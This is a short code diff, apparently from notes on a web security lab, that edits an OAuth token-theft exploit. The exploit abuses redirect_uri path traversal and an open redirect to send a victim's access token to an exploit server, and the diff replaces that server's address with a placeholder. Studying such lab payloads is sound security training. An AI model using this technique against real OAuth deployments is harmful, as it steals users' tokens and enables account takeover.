@@ -43,7 +43,7 @@
 //----------------------//
 <script>
   if (!document.location.hash) {
-    window.location = 'https://<OAUTH-IP>/auth?client_id=g4c0gltgknmy2ycmupioa&redirect_uri=<IP-LAB>/oauth-callback/../post/next?path=https://exploit-0a4c006b039157ca80ddf7830129001d.exploit-server.net&response_type=token&nonce=1727033259&scope=openid%20profile%20email';
+    window.location = 'https://<OAUTH-IP>/auth?client_id=g4c0gltgknmy2ycmupioa&redirect_uri=<IP-LAB>/oauth-callback/../post/next?path=https://<EXPLOIT-SV>&response_type=token&nonce=1727033259&scope=openid%20profile%20email';
   } else {
     window.location = '/?' + document.location.hash.substr(1);
   }
